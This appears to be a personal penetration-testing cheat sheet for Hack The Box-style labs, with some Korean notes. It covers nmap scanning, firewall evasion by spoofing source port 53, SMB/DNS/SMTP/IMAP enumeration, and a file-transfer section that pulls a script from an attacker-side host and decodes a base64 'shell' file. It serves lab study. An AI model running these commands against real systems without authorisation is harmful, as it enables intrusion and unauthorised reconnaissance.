# Banner Graping
```bash
nc -nv <ip> <port>

curl -IL https://www.inlanefreight.com

whatweb --no-errors 10.10.10.0/24

ssl certificate

http://10.10.10.10/robots.txt

javascript source code
```
---
# File transfer
```bash
wget http://10.10.14.1:8000/linenum.sh

curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

scp linenum.sh user@remotehost:/tmp/linenum.sh

echo <base64 encoded file> | base64 -d > shell
```
---
# nmap
```bash
sudo nmap -sn -oA tnet -iL ip.list

sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace --disable-arp-ping
```
- `-sn` : Disables port scanning.
- `-PE` : ICMP Echo requests(ping test)
-  `--disable-arp-ping` : 라우터 너머에 있는 호스트는 ARP로 도달 불가능하므로 ICMP/TCP 필요
---
# 방화벽 우회

```bash
sudo nmap -sV 10.129.22.22 -Pn -p53 -sU

sudo nmap -sV 10.129.22.22 -Pn -p53

sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53

ncat -nv -p 53 10.129.2.28 50000
```
- DNS는 TCP,UDP 둘다 53번 포트에서 작동하며, 크기에 따라서 사용이 달라진다.
- 내 IP 주소의 53번 포트에서 패킷을 전송하여 일부 방화벽에서는 53번 포트가 안전하다 생각해서 패킷을 통과시켜 주는 경우가 있는 것.
---
# Foot printing
## SSL certificate
<img width="969" height="759" alt="image" src="https://github.com/user-attachments/assets/9b03c318-cce6-4810-ab5d-0c70a0648c2b" />

## FTP SSL certificate
```bash
openssl s_client -connect 10.129.14.136:21 -starttls ftp
```
- nmap 스캔시 `AUTH TLS`가 보이면 SSL 연결 지원이라는 것을 확인할 수 있다.

## SMB rpc client
```bash
rpcclient -U '' -N 10.129.23.91

#rpcclient
querydominfo
netshareenumall
netsharegetinfo <share>
enumdomusers
queryuser <RID>
```
- `querydominfo` : Provides domain, server, and user information of deployed domains.
- `netshareenumall` : Enumerates all available shares.
- `netsharegetinfo <share>` : Provides information about a specific share.
- `enumdomusers` : Enumerates all domain users.
- `queryuser <RID>` : Provides information about a specific user.

## NFS
```bash
showmount -e <target>

sudo mount -t nfs 10.129.14.128:/target ./target/ -o nolock

sudo umount ./target
```

## DNS
```bash
dig ns inlanefreight.htb @10.129.14.128

dig CH TXT version.bind @10.129.120.85

dig any inlanefreight.htb @10.129.14.128

dig axfr inlanefreight.htb @10.129.14.128

dnsenum --dnsserver 10.129.167.221 --enum -p 0 -s 0 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt inlanefreight.htb
```
- nmap에서 DNS가 발견되면 사용

## SMTP
```bash 
smtp-user-enum -M VRFY -U footprinting-wordlist.txt -t 10.129.42.195 -w 20 -v
```
- some SMTP servers have higher response times.

## IMAP and POP3
```bash
openssl s_client -connect 10.129.14.128:pop3s

openssl s_client -connect 10.129.14.128:imaps
```
### IMAP
```bash
telnet <ip> 143

a LOGIN <id> <password>
a LIST "" *
a SELECT INBOX
a SEARCH ALL
a fetch <NUMBER> body[header]
a fetch <NUMBER> body[text]
a LOGOUT
```
- 메일박스를 선택할 때 대소문자 구별해서 선택해야 한다.
